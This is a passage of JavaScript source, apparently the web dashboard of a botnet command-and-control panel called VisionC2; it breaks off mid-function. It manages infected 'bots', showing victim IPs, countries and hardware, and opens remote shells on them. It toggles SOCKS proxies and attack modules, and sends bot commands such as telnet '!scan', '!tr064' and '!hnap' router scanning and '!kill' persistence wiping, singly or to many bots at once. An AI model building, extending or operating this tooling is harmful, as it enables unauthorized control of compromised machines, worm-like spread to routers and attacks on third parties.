/* ============================================================================
   VisionC2 Dashboard Application
   Vanilla JS — SSE with polling fallback, diff-based table updates,
   filter panel, multi-select, enhanced shell modal with file browser,
   breadcrumb nav, tab completion, split shell, bot info sidebar.
   ============================================================================ */

// ---------------------------------------------------------------------------
// Utility helpers
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// localStorage persistence helpers
// ---------------------------------------------------------------------------

var LS_PREFIX = 'vision_';
function lsSet(key, val) { try { localStorage.setItem(LS_PREFIX + key, JSON.stringify(val)); } catch (e) { } }
function lsGet(key, def) { try { var v = localStorage.getItem(LS_PREFIX + key); return v !== null ? JSON.parse(v) : def; } catch (e) { return def; } }
function lsDel(key) { try { localStorage.removeItem(LS_PREFIX + key); } catch (e) { } }

function formatRAM(mb) {
  return mb >= 1024 ? (mb / 1024).toFixed(1) + 'GB' : mb + 'MB';
}

function formatUplink(mbps) {
  if (!mbps || mbps <= 0) return '<span style="opacity:0.4">-</span>';
  if (mbps >= 1000) return '<span style="color:#58a6ff">' + (mbps / 1000).toFixed(1) + ' Gbps</span>';
  return '<span style="color:#58a6ff">' + mbps.toFixed(1) + ' Mbps</span>';
}

function capTagsHtml(b) {
  if (b.attacksEnabled && b.socksEnabled) {
    return '<span class="cap-tag cap-tag-atk" title="Attacks enabled">ATK</span><span class="cap-tag cap-tag-socks" title="SOCKS enabled">SOCKS</span>';
  }
  if (b.attacksEnabled) return '<span class="cap-tag cap-tag-atk" title="Attacks enabled">ATK</span>';
  if (b.socksEnabled)   return '<span class="cap-tag cap-tag-socks" title="SOCKS enabled">SOCKS</span>';
  return '<span class="cap-tag cap-tag-none" title="No special modules">-</span>';
}

function ago(iso) {
  var d = new Date(iso), s = Math.max(0, Math.floor((Date.now() - d) / 1000));
  if (s < 5) return 'just now';
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
  return Math.floor(s / 86400) + 'd ago';
}

function botHealth(lastPing) {
  var s = Math.floor((Date.now() - new Date(lastPing)) / 1000);
  if (s < 30) return { cls: 'health-ok', dot: 'health-dot-ok', row: 'health-ok-row' };
  if (s < 60) return { cls: 'health-warn', dot: 'health-dot-warn', row: 'health-warn-row' };
  if (s < 120) return { cls: 'health-stale', dot: 'health-dot-stale', row: 'health-stale-row' };
  return { cls: 'health-dead', dot: 'health-dot-dead', row: 'health-dead-row' };
}

function escHtml(s) {
  var d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

function showToast(msg, ok) {
  var t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast ' + (ok ? 'ok' : 'err');
  setTimeout(function () { t.className = 'toast'; }, 3000);
  var now = new Date();
  var ts = ('0' + now.getHours()).slice(-2) + ':' + ('0' + now.getMinutes()).slice(-2) + ':' + ('0' + now.getSeconds()).slice(-2);
  addNotification(ts, (ok ? 'OK' : 'ERR') + ': ' + msg);
}

function sanitizeId(id) {
  return id.replace(/[^a-zA-Z0-9_-]/g, '_');
}

// Color-coded group tags — deterministic color from group name
var groupColors = [
  { bg: 'rgba(139, 92, 246, 0.12)', fg: '#a78bfa', border: 'rgba(139, 92, 246, 0.3)' },  // purple
  { bg: 'rgba(59, 130, 246, 0.12)', fg: '#60a5fa', border: 'rgba(59, 130, 246, 0.3)' },   // blue
  { bg: 'rgba(34, 197, 94, 0.12)', fg: '#4ade80', border: 'rgba(34, 197, 94, 0.3)' },    // green
  { bg: 'rgba(234, 179, 8, 0.12)', fg: '#facc15', border: 'rgba(234, 179, 8, 0.3)' },    // yellow
  { bg: 'rgba(6, 182, 212, 0.12)', fg: '#22d3ee', border: 'rgba(6, 182, 212, 0.3)' },    // cyan
  { bg: 'rgba(239, 68, 68, 0.12)', fg: '#f87171', border: 'rgba(239, 68, 68, 0.3)' },    // red
  { bg: 'rgba(249, 115, 22, 0.12)', fg: '#fb923c', border: 'rgba(249, 115, 22, 0.3)' },   // orange
  { bg: 'rgba(168, 85, 247, 0.12)', fg: '#c084fc', border: 'rgba(168, 85, 247, 0.3)' },   // violet
  { bg: 'rgba(236, 72, 153, 0.12)', fg: '#f472b6', border: 'rgba(236, 72, 153, 0.3)' },   // pink
  { bg: 'rgba(20, 184, 166, 0.12)', fg: '#2dd4bf', border: 'rgba(20, 184, 166, 0.3)' },   // teal
];

function groupColorIndex(name) {
  var hash = 0;
  for (var i = 0; i < name.length; i++) { hash = ((hash << 5) - hash) + name.charCodeAt(i); hash |= 0; }
  return Math.abs(hash) % groupColors.length;
}

function groupTagHtml(group) {
  if (!group) return '<span class="group-tag group-none">-</span>';
  var c = groupColors[groupColorIndex(group)];
  return '<span class="group-tag" style="background:' + c.bg + ';color:' + c.fg + ';border:1px solid ' + c.border + '">' + escHtml(group) + '</span>';
}

// ---------------------------------------------------------------------------
// SSE (Server-Sent Events)
// ---------------------------------------------------------------------------

var evtSource = null;
var sseRetryDelay = 1000;
var sseFails = 0;
var sseActive = false;
var pollingActive = false;
var pollingTimer = null;

function connectSSE() {
  if (evtSource) evtSource.close();
  evtSource = new EventSource('/api/events');

  evtSource.onopen = function () {
    sseRetryDelay = 1000; sseFails = 0; sseActive = true;
    updateSSEIndicator(true);
    stopPolling();
  };

  evtSource.addEventListener('stats', function (e) { updateStats(JSON.parse(e.data)); });
  evtSource.addEventListener('bots', function (e) { updateBots(JSON.parse(e.data)); });
  evtSource.addEventListener('activity', function (e) { addActivityEntry(JSON.parse(e.data)); });
  evtSource.addEventListener('bot_connect', function (e) {
    var bot = JSON.parse(e.data);
    addOrUpdateBot(bot);
    addNotification('connect', bot.botID + ' connected');
  });
  evtSource.addEventListener('bot_disconnect', function (e) {
    var d = JSON.parse(e.data);
    removeBot(d.botID);
    addNotification('disconnect', d.botID + ' disconnected');
  });
  evtSource.addEventListener('socks_update', function (e) { updateBotSocks(JSON.parse(e.data)); });

  evtSource.onerror = function () {
    updateSSEIndicator(false); sseActive = false; evtSource.close(); sseFails++;
    if (sseFails > 3 && !pollingActive) { startPolling(); }
    else { setTimeout(connectSSE, sseRetryDelay); sseRetryDelay = Math.min(sseRetryDelay * 2, 30000); }
  };
}

var _sseRedTimer = null;
function showSSEBanner() {
  if (document.getElementById('sse-banner')) return;
  var b = document.createElement('div');
  b.id = 'sse-banner';
  b.className = 'sse-banner';
  b.textContent = '\u26a0\ufe0f  Live connection lost \u2014 reconnecting...';
  document.body.appendChild(b);
}

function hideSSEBanner() {
  var el = document.getElementById('sse-banner');
  if (el) el.remove();
}

function updateSSEIndicator(connected) {
  clearTimeout(_sseRedTimer);
  var el = document.getElementById('sse-dot');
  if (connected) {
    if (el) { el.className = 'sse-indicator sse-connected'; el.title = 'Live connection'; }
    hideSSEBanner();
  } else {
    _sseRedTimer = setTimeout(function () {
      if (el) { el.className = 'sse-indicator sse-disconnected'; el.title = 'Reconnecting...'; }
      showSSEBanner();
    }, 3000);
  }
}

function startPolling() {
  if (pollingActive) return;
  pollingActive = true;
  pollingTimer = setInterval(function () {
    fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
    fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
    fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
    loadRelayStats();
  }, 5000);
}

function stopPolling() {
  if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
  pollingActive = false;
}

// ---------------------------------------------------------------------------
// Stats
// ---------------------------------------------------------------------------

var prevBots = -1, prevRAM = -1, prevCPU = -1;

function updateStats(d) {
  document.getElementById('s-bots').textContent = d.botCount;
  document.getElementById('s-ram').textContent = formatRAM(d.totalRAM);
  document.getElementById('s-cpu').textContent = d.totalCPU + ' cores';
  document.getElementById('s-uptime').textContent = d.uptime;

  var ah = document.getElementById('s-arch');
  ah.innerHTML = '';
  if (d.archMap) {
    Object.entries(d.archMap).forEach(function (e) {
      var s = document.createElement('span'); s.className = 'arch-pill'; s.textContent = e[0] + ': ' + e[1]; ah.appendChild(s);
    });
  }

  setDelta('s-bots-delta', d.botCount, prevBots); prevBots = d.botCount;
  setDelta('s-ram-delta', d.totalRAM, prevRAM); prevRAM = d.totalRAM;
  setDelta('s-cpu-delta', d.totalCPU, prevCPU); prevCPU = d.totalCPU;

  if (d.history && d.history.length > 1) {
    drawSparkline('spark-bots', d.history.map(function (h) { return h.botCount; }));
    drawSparkline('spark-ram', d.history.map(function (h) { return h.totalRAM; }));
    drawSparkline('spark-cpu', d.history.map(function (h) { return h.totalCPU; }));
    var bots = d.history.map(function (h) { return h.botCount; });
    var mn = Math.min.apply(null, bots), mx = Math.max.apply(null, bots);
    document.getElementById('s-bots-range').textContent = 'range: ' + mn + ' \u2013 ' + mx + ' (' + d.history.length + ' samples)';
  }
}

function setDelta(id, cur, prev) {
  var el = document.getElementById(id);
  if (!el || prev < 0) return;
  var diff = cur - prev;
  if (diff > 0) { el.textContent = '+' + diff; el.className = 'stat-delta up'; }
  else if (diff < 0) { el.textContent = '' + diff; el.className = 'stat-delta down'; }
  else { el.textContent = ''; el.className = 'stat-delta flat'; }
}

function drawSparkline(id, vals) {
  var svg = document.getElementById(id);
  if (!svg || !vals.length) return;
  var mn = Math.min.apply(null, vals), mx = Math.max.apply(null, vals);
  var range = mx - mn || 1;
  var w = 120, h = 32, pad = 2;
  var pts = [];
  for (var i = 0; i < vals.length; i++) {
    var x = (i / (vals.length - 1)) * w;
    var y = pad + (h - 2 * pad) * (1 - (vals[i] - mn) / range);
    pts.push(x.toFixed(1) + ',' + y.toFixed(1));
  }
  var line = pts.join(' ');
  var fill = pts[0].split(',')[0] + ',' + h + ' ' + line + ' ' + pts[pts.length - 1].split(',')[0] + ',' + h;
  svg.innerHTML = '<polygon class="spark-fill" points="' + fill + '"/><polyline points="' + line + '"/>';
}

// ---------------------------------------------------------------------------
// Diff-based bot table updates
// ---------------------------------------------------------------------------

var botState = {};
var botOrder = [];
var selectedBots = {};

function updateBots(bots) {
  var newState = {};
  bots.forEach(function (b) { newState[b.botID] = b; });

  botOrder.forEach(function (id) {
    if (!newState[id]) {
      var row = document.getElementById('bot-' + sanitizeId(id));
      if (row) row.remove();
      delete selectedBots[id];
    }
  });

  var tbody = document.getElementById('bot-tbody');
  botOrder = bots.map(function (b) { return b.botID; });

  bots.forEach(function (b) {
    var existing = botState[b.botID];
    var rowId = 'bot-' + sanitizeId(b.botID);
    var row = document.getElementById(rowId);
    if (!row) { row = createBotRow(b); tbody.appendChild(row); }
    else if (botChanged(existing, b)) { updateBotRow(row, b); refreshSidebarIfOpen(b.botID); }
  });

  botState = newState;
  window._bots = newState;
  window._botsArr = bots;
  updateBotCount();
  renderSocksDash();
  buildFilterPanel();
  filterBotTable();
  updateGroupStats();
}

function addOrUpdateBot(b) {
  botState[b.botID] = b;
  if (botOrder.indexOf(b.botID) === -1) botOrder.push(b.botID);
  var rowId = 'bot-' + sanitizeId(b.botID);
  var row = document.getElementById(rowId);
  var tbody = document.getElementById('bot-tbody');
  if (!row) { row = createBotRow(b); tbody.appendChild(row); }
  else { updateBotRow(row, b); refreshSidebarIfOpen(b.botID); }
  window._bots = botState;
  updateBotCount();
  buildFilterPanel();
  filterBotTable();
  updateGroupStats();
}

function removeBot(botID) {
  delete botState[botID]; delete selectedBots[botID];
  botOrder = botOrder.filter(function (id) { return id !== botID; });
  var row = document.getElementById('bot-' + sanitizeId(botID));
  if (row) row.remove();
  if (_sidebarBotID === botID) closeBotSidebar();
  window._bots = botState;
  updateBotCount(); renderSocksDash(); updateMultiSelectBar(); updateGroupStats();
}

function updateBotSocks(d) {
  if (!d || !d.botID) return;
  var b = botState[d.botID]; if (!b) return;
  b.socksActive = d.socksActive; b.socksRelay = d.socksRelay || '';
  b.socksUser = d.socksUser || ''; b.socksStarted = d.socksStarted || '';
  botState[d.botID] = b; window._bots = botState;
  var row = document.getElementById('bot-' + sanitizeId(d.botID));
  if (row) { updateBotRow(row, b); refreshSidebarIfOpen(b.botID); }
  renderSocksDash();
}

function refreshSidebarIfOpen(botID) {
  if (_sidebarBotID && _sidebarBotID === botID) {
    var b = window._bots && window._bots[botID];
    if (b) renderBotSidebar(b);
  }
}

function botChanged(a, b) {
  if (!a) return true;
  return a.socksActive !== b.socksActive || a.socksRelay !== b.socksRelay ||
    a.uptime !== b.uptime || a.lastPing !== b.lastPing ||
    a.ram !== b.ram || a.cpuCores !== b.cpuCores || a.group !== b.group;
}

function updateBotCount() {
  var count = botOrder.length;
  var el = document.getElementById('tab-bots-count');
  if (el) el.textContent = count;
  if (count === 0) {
    var tbody = document.getElementById('bot-tbody');
    if (!tbody.querySelector('tr')) {
      tbody.innerHTML = '<tr><td colspan="13" class="no-bots">No bots connected</td></tr>';
    }
  }
}

function createBotRow(b) {
  var tr = document.createElement('tr');
  tr.className = 'bot-row';
  tr.id = 'bot-' + sanitizeId(b.botID);
  tr.setAttribute('data-botid', b.botID);
  tr.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; openBotSidebar(b.botID); };
  tr.oncontextmenu = function (ev) { ev.preventDefault(); pinBotPopup(ev, b.botID); };
  tr.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };

  var socksHtml = b.socksActive
    ? '<span class="socks-badge socks-on"><span class="socks-dot"></span>ON</span>'
    : '<span class="socks-badge socks-off"><span class="socks-dot"></span>OFF</span>';
  var checked = selectedBots[b.botID] ? ' checked' : '';

  var h = botHealth(b.lastPing);
  tr.className = 'bot-row ' + h.row;

  var eid = b.botID.replace(/'/g, "\\'");
  tr.innerHTML =
    '<td><input type="checkbox"' + checked + ' onchange="toggleBotSelect(\'' + eid + '\',this.checked)"></td>' +
    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" data-tooltip="Click to set as target in Command Center" title="' + escHtml(b.botID) + '">' + escHtml(b.botID) + '</span></td>' +
    '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
    '<td><span class="country-badge">' + escHtml(b.country) + '</span></td>' +
    '<td>' + groupTagHtml(b.group) + '</td>' +
    '<td>' + escHtml(b.arch) + '</td>' +
    '<td>' + formatRAM(b.ram) + '</td>' +
    '<td>' + b.cpuCores + '</td>' +
    '<td>' + formatUplink(b.uplinkMbps) + '</td>' +
    '<td>' + escHtml(b.processName) + '</td>' +
    '<td>' + capTagsHtml(b) + '</td>' +
    '<td>' + socksHtml + '</td>' +
    '<td>' + escHtml(b.uptime) + '</td>' +
    '<td class="' + h.cls + '"><span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing) + '</td>';
  return tr;
}

function updateBotRow(row, b) {
  var cells = row.getElementsByTagName('td');
  if (cells.length < 14) return;
  var socksHtml = b.socksActive
    ? '<span class="socks-badge socks-on"><span class="socks-dot"></span>ON</span>'
    : '<span class="socks-badge socks-off"><span class="socks-dot"></span>OFF</span>';
  cells[4].innerHTML = groupTagHtml(b.group);
  cells[6].textContent = formatRAM(b.ram);
  cells[7].textContent = b.cpuCores;
  cells[8].innerHTML = formatUplink(b.uplinkMbps);
  cells[9].textContent = b.processName;
  cells[10].innerHTML = capTagsHtml(b);
  cells[11].innerHTML = socksHtml;
  cells[12].textContent = b.uptime;
  var h = botHealth(b.lastPing);
  cells[13].className = h.cls;
  cells[13].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
  row.className = 'bot-row ' + h.row;
  row.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; openBotSidebar(b.botID); };
  row.oncontextmenu = function (ev) { ev.preventDefault(); pinBotPopup(ev, b.botID); };
  row.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };
}

// ---------------------------------------------------------------------------
// Multi-select
// ---------------------------------------------------------------------------

function toggleBotSelect(botID, checked) {
  if (checked) selectedBots[botID] = true;
  else delete selectedBots[botID];
  updateMultiSelectBar();
}

function toggleSelectAll(checked) {
  var rows = document.querySelectorAll('#bot-tbody tr.bot-row');
  rows.forEach(function (r) {
    if (r.style.display === 'none') return;
    var cb = r.querySelector('input[type=checkbox]');
    var id = r.getAttribute('data-botid');
    if (cb) { cb.checked = checked; }
    if (checked) selectedBots[id] = true;
    else delete selectedBots[id];
  });
  updateMultiSelectBar();
}

function updateMultiSelectBar() {
  var count = Object.keys(selectedBots).length;
  var bar = document.getElementById('multi-select-bar');
  bar.style.display = count > 0 ? 'flex' : 'none';
  document.getElementById('ms-count').textContent = count + ' selected';
}

function msCmd(cmd) {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  ids.forEach(function (id) { popupCmd(id, cmd); });
  showToast('Sent ' + cmd + ' to ' + ids.length + ' bots', true);
}

function msCmdFiltered(cmd, capField) {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  var capable = ids.filter(function (id) {
    var b = botState[id];
    return !capField || !b || b[capField] !== false;
  });
  var skipped = ids.length - capable.length;
  if (!capable.length) { showToast('No selected bots support this command', false); return; }
  capable.forEach(function (id) { popupCmd(id, cmd); });
  var msg = 'Sent ' + cmd + ' to ' + capable.length + ' bot' + (capable.length > 1 ? 's' : '');
  if (skipped > 0) msg += ' \xb7 ' + skipped + ' skipped (module absent)';
  showToast(msg, true);
}

function msScan() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  var addr = prompt('Scan server address (host:port):', '');
  if (!addr || !addr.trim()) return;
  ids.forEach(function (id) { popupCmd(id, '!scan ' + addr.trim()); });
  showToast('Sent !scan to ' + ids.length + ' bots', true);
}

// ---------------------------------------------------------------------------
// Scanner Tab — global start/stop
// ---------------------------------------------------------------------------
function scannerStart(type) {
  var cmd;
  if (type === 'telnet') {
    var addr = document.getElementById('scan-telnet-addr').value.trim();
    if (!addr) { showToast('Enter a scan server address', false); return; }
    cmd = '!scan ' + addr;
  } else if (type === 'tr064') {
    cmd = '!tr064';
  } else if (type === 'hnap') {
    cmd = '!hnap';
  } else { return; }
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
    .catch(function () { showToast('Request failed', false); });
}

function scannerStop(type) {
  var cmd;
  if (type === 'telnet') { cmd = '!stopscan'; }
  else if (type === 'tr064') { cmd = '!stoptr064'; }
  else if (type === 'hnap') { cmd = '!stophnap'; }
  else { return; }
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
    .catch(function () { showToast('Request failed', false); });
}

function msKill() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  var preview = ids.slice(0, 4).map(function (id) { return {label: 'Bot', val: id}; });
  if (ids.length > 4) preview.push({label: '', val: '\u2026and ' + (ids.length - 4) + ' more'});
  showConfirm({
    title: 'Kill ' + ids.length + ' bot' + (ids.length > 1 ? 's' : '') + '?',
    message: 'Wipes persistence, deletes binary, and terminates. Cannot be undone.',
    icon: 'danger', confirmClass: 'danger', confirmText: 'Kill All',
    details: preview,
    onConfirm: function () {
      ids.forEach(function (id) { popupCmd(id, '!kill'); });
      selectedBots = {}; updateMultiSelectBar();
    }
  });
}

function msOpenShells() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  // Open first shell, add others as tabs
  openShell(ids[0]);
  for (var i = 1; i < ids.length && i < 8; i++) {
    addShellTab(ids[i]);
  }
}

// ---------------------------------------------------------------------------
// Group Assignment
// ---------------------------------------------------------------------------

function showGroupPicker(botIDs, anchorEl) {
  // Remove existing picker
  var old = document.getElementById('group-picker-overlay');
  if (old) old.remove();

  // Fetch existing groups for autocomplete
  fetch('/api/groups').then(function (r) { return r.json(); }).then(function (groups) {
    var opts = (groups || []).map(function (g) {
      return '<option value="' + escHtml(g) + '">' + escHtml(g) + '</option>';
    }).join('');

    var d = document.createElement('div');
    d.id = 'group-picker-overlay';
    d.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
    d.innerHTML = '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:20px;min-width:340px">' +
      '<div style="font-size:14px;font-weight:600;margin-bottom:12px;color:var(--text)">Set Group for ' + botIDs.length + ' bot' + (botIDs.length > 1 ? 's' : '') + '</div>' +
      '<div style="margin-bottom:12px">' +
      '<input type="text" id="group-pick-input" list="group-pick-list" placeholder="Type group name or select..." style="width:100%;padding:8px;background:var(--bg-primary);border:1px solid var(--border);color:var(--text);border-radius:4px;font-size:13px">' +
      '<datalist id="group-pick-list">' + opts + '</datalist>' +
      '</div>' +
      '<div style="display:flex;gap:8px;justify-content:flex-end">' +
      '<button id="group-pick-remove" style="padding:6px 16px;background:var(--red-dim);border:1px solid var(--red);color:var(--red);border-radius:4px;cursor:pointer;font-size:12px;font-weight:600">Remove Group</button>' +
      '<button id="group-pick-cancel" style="padding:6px 16px;background:var(--bg-elevated);border:1px solid var(--border);color:var(--text);border-radius:4px;cursor:pointer">Cancel</button>' +
      '<button id="group-pick-ok" style="padding:6px 16px;background:var(--accent);border:none;color:#fff;border-radius:4px;cursor:pointer;font-weight:600">Apply</button>' +
      '</div></div>';
    document.body.appendChild(d);
    d.addEventListener('click', function (e) { if (e.target === d) d.remove(); });
    document.getElementById('group-pick-cancel').onclick = function () { d.remove(); };
    document.getElementById('group-pick-ok').onclick = function () {
      var val = document.getElementById('group-pick-input').value.trim();
      if (!val) { return; }
      applyGroup(botIDs, val);
      d.remove();
    };
    document.getElementById('group-pick-remove').onclick = function () {
      applyGroup(botIDs, '');
      d.remove();
    };
    document.getElementById('group-pick-input').focus();
    document.getElementById('group-pick-input').addEventListener('keydown', function (e) {
      if (e.key === 'Enter') { document.getElementById('group-pick-ok').click(); }
      if (e.key === 'Escape') { d.remove(); }
    });
  }).catch(function () {
    var val = prompt('Enter group name (empty to remove):');
    if (val === null) return;
    applyGroup(botIDs, val.trim());
  });
}

function applyGroup(botIDs, group) {
  fetch('/api/group', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ botIDs: botIDs, group: group })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      showToast(d.message, d.success);
      // Update local state immediately
      botIDs.forEach(function (id) {
        if (botState[id]) { botState[id].group = group; }
      });
      window._bots = botState;
      window._botsArr = botOrder.map(function (id) { return botState[id]; }).filter(Boolean);
      // Re-render affected rows
      botIDs.forEach(function (id) {
        var row = document.getElementById('bot-' + sanitizeId(id));
        if (row && botState[id]) updateBotRow(row, botState[id]);
      });
      lastFilterHash = '';
      buildFilterPanel();
      filterBotTable();
    })
    .catch(function () { showToast('Group request failed', false); });
}

function msSetGroup() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  showGroupPicker(ids);
}

function popupSetGroup(botID) {
  showGroupPicker([botID]);
}

// ---------------------------------------------------------------------------
// Filter Panel
// ---------------------------------------------------------------------------

var activeFilters = { group: {}, arch: {}, country: {}, socks: {}, ram: {}, cpu: {} };
var lastFilterHash = '';

function buildFilterPanel() {
  if (!window._botsArr || !window._botsArr.length) return;
  var bots = window._botsArr;

  // Collect unique values
  var groups = {}, archs = {}, countries = {}, socks = { 'ON': 0, 'OFF': 0 };
  var ramRanges = { '< 1GB': 0, '1-4GB': 0, '4-16GB': 0, '16GB+': 0 };
  var cpuRanges = { '1 core': 0, '2-4 cores': 0, '4+ cores': 0 };

  bots.forEach(function (b) {
    var gk = b.group || '(ungrouped)';
    groups[gk] = (groups[gk] || 0) + 1;
    archs[b.arch] = (archs[b.arch] || 0) + 1;
    countries[b.country] = (countries[b.country] || 0) + 1;
    if (b.socksActive) socks['ON']++; else socks['OFF']++;
    if (b.ram < 1024) ramRanges['< 1GB']++;
    else if (b.ram < 4096) ramRanges['1-4GB']++;
    else if (b.ram < 16384) ramRanges['4-16GB']++;
    else ramRanges['16GB+']++;
    if (b.cpuCores <= 1) cpuRanges['1 core']++;
    else if (b.cpuCores <= 4) cpuRanges['2-4 cores']++;
    else cpuRanges['4+ cores']++;
  });

  var hash = JSON.stringify([groups, archs, countries, socks, ramRanges, cpuRanges]);
  if (hash === lastFilterHash) return;
  lastFilterHash = hash;

  var wrap = document.getElementById('filter-groups');
  wrap.innerHTML = '';

  function makeGroup(label, key, items) {
    var g = document.createElement('div'); g.className = 'filter-group';
    g.innerHTML = '<span class="filter-group-label">' + label + '</span>';
    var chips = document.createElement('div'); chips.className = 'filter-chips';
    Object.entries(items).forEach(function (e) {
      var val = e[0], cnt = e[1];
      var chip = document.createElement('label');
      chip.className = 'filter-chip' + (activeFilters[key][val] ? ' active' : '');
      chip.innerHTML = '<span class="filter-chip-dot"></span><input type="checkbox"' +
        (activeFilters[key][val] ? ' checked' : '') + '> ' + escHtml(val) + ' <span style="color:var(--text-dim)">(' + cnt + ')</span>';
      chip.onclick = function () {
        var cb = chip.querySelector('input');
        cb.checked = !cb.checked;
        if (cb.checked) { activeFilters[key][val] = true; chip.classList.add('active'); }
        else { delete activeFilters[key][val]; chip.classList.remove('active'); }
        filterBotTable();
      };
      chips.appendChild(chip);
    });
    g.appendChild(chips);
    wrap.appendChild(g);
  }

  if (Object.keys(groups).length > 1 || (Object.keys(groups).length === 1 && !groups['(ungrouped)'])) {
    makeGroup('Group', 'group', groups);
  }
  makeGroup('Arch', 'arch', archs);
  makeGroup('Country', 'country', countries);
  makeGroup('SOCKS', 'socks', socks);
  makeGroup('RAM', 'ram', ramRanges);
  makeGroup('CPU', 'cpu', cpuRanges);
}

function clearAllFilters() {
  activeFilters = { group: {}, arch: {}, country: {}, socks: {}, ram: {}, cpu: {} };
  document.getElementById('bot-search').value = '';
  lastFilterHash = '';
  lsDel('filters');
  lsDel('search');
  buildFilterPanel();
  filterBotTable();
}

function hasActiveFilters() {
  for (var k in activeFilters) {
    if (Object.keys(activeFilters[k]).length > 0) return true;
  }
  return false;
}

function botMatchesFilters(b) {
  if (Object.keys(activeFilters.group).length) {
    var gk = b.group || '(ungrouped)';
    if (!activeFilters.group[gk]) return false;
  }
  if (Object.keys(activeFilters.arch).length && !activeFilters.arch[b.arch]) return false;
  if (Object.keys(activeFilters.country).length && !activeFilters.country[b.country]) return false;
  if (Object.keys(activeFilters.socks).length) {
    var st = b.socksActive ? 'ON' : 'OFF';
    if (!activeFilters.socks[st]) return false;
  }
  if (Object.keys(activeFilters.ram).length) {
    var rk;
    if (b.ram < 1024) rk = '< 1GB';
    else if (b.ram < 4096) rk = '1-4GB';
    else if (b.ram < 16384) rk = '4-16GB';
    else rk = '16GB+';
    if (!activeFilters.ram[rk]) return false;
  }
  if (Object.keys(activeFilters.cpu).length) {
    var ck;
    if (b.cpuCores <= 1) ck = '1 core';
    else if (b.cpuCores <= 4) ck = '2-4 cores';
    else ck = '4+ cores';
    if (!activeFilters.cpu[ck]) return false;
  }
  return true;
}

// ---------------------------------------------------------------------------
// Bot search / filter (enhanced with filter panel)
// ---------------------------------------------------------------------------

function filterBotTable() {
  var q = (document.getElementById('bot-search').value || '').toLowerCase();
  lsSet('search', q);
  lsSet('filters', activeFilters);
  var rows = document.querySelectorAll('#bot-tbody tr.bot-row');
  var shown = 0, total = rows.length;
  var useFilters = hasActiveFilters();

  rows.forEach(function (r) {
    var id = r.getAttribute('data-botid');
    var b = botState[id];
    var textMatch = !q || r.textContent.toLowerCase().indexOf(q) !== -1;
    var filterMatch = !useFilters || (b && botMatchesFilters(b));
    if (textMatch && filterMatch) { r.style.display = ''; shown++; }
    else { r.style.display = 'none'; }
  });

  var sc = document.getElementById('search-count');
  if (q || useFilters) { sc.textContent = shown + ' / ' + total + ' bots'; }
  else { sc.textContent = total + ' bots'; }
}

// ---------------------------------------------------------------------------
// Bot Info Popup
// ---------------------------------------------------------------------------

var popupPinned = false, popupBotID = '';

function fillPopup(b) {
  document.getElementById('popup-botid').textContent = b.botID;
  document.getElementById('popup-country').textContent = b.country;
  document.getElementById('popup-ip').textContent = b.ip;
  document.getElementById('popup-arch').textContent = b.arch;
  document.getElementById('popup-ram').textContent = formatRAM(b.ram);
  document.getElementById('popup-cpu').textContent = b.cpuCores + ' cores';
  document.getElementById('popup-uplink').innerHTML = formatUplink(b.uplinkMbps);
  document.getElementById('popup-proc').textContent = b.processName;
  document.getElementById('popup-uptime').textContent = b.uptime;
  document.getElementById('popup-ping').textContent = ago(b.lastPing);

  var ss = document.getElementById('popup-socks-status');
  if (b.socksActive) {
    ss.innerHTML = '<span class="popup-socks-active">ONLINE</span>';
    document.getElementById('popup-socks-relay-row').style.display = '';
    document.getElementById('popup-socks-relay').textContent = b.socksRelay || '-';
    document.getElementById('popup-socks-auth-row').style.display = b.socksUser ? '' : 'none';
    if (b.socksUser) document.getElementById('popup-socks-user').textContent = b.socksUser;
    document.getElementById('popup-socks-since-row').style.display = b.socksStarted ? '' : 'none';
    if (b.socksStarted) document.getElementById('popup-socks-since').textContent = ago(b.socksStarted);
  } else {
    ss.innerHTML = '<span class="popup-socks-inactive">OFFLINE</span>';
    document.getElementById('popup-socks-relay-row').style.display = 'none';
    document.getElementById('popup-socks-auth-row').style.display = 'none';
    document.getElementById('popup-socks-since-row').style.display = 'none';
  }

  var acts = document.getElementById('popup-actions');
  var id = b.botID.replace(/'/g, "\\'");
  var html = '<button class="popup-act act-group" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="Assign to a named group for batch targeting">' + (b.group ? 'Group: ' + escHtml(b.group) : 'Set Group') + '</button>';
